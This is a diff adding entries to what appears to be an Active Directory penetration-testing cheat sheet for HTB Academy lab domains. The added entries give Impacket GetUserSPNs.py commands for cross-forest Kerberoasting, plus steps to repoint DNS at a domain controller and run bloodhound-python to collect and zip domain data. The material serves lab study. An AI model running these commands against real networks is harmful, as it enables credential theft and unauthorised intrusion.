@@ -1598,6 +1598,28 @@ PS C:\htb> Convert-SidToName <SID>
 PS C:\> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential <domain>\administrator
 ```
 
+- Cross-Forest Kerberoasting Trusts (Linux - Impacket)
+
+```
+$ GetUserSPNs.py -target-domain <target domain> <domain>/<username>
+$ GetUserSPNs.py -request -target-domain <target domain> <domain>/<username>
+```
+
+- Cross-Forest Admin Password Re-Use & Group Memberships (Linux - Bloodhound-python)
+
+```
+$ sudo nano /etc/resolv.conf
+
+Add:
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+
+$ bloodhound-python -d <target domain> -dc  <target Domain Controller> -c All -u <username -p <password>
+$ zip -r ilfreight_bh.zip *.json
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
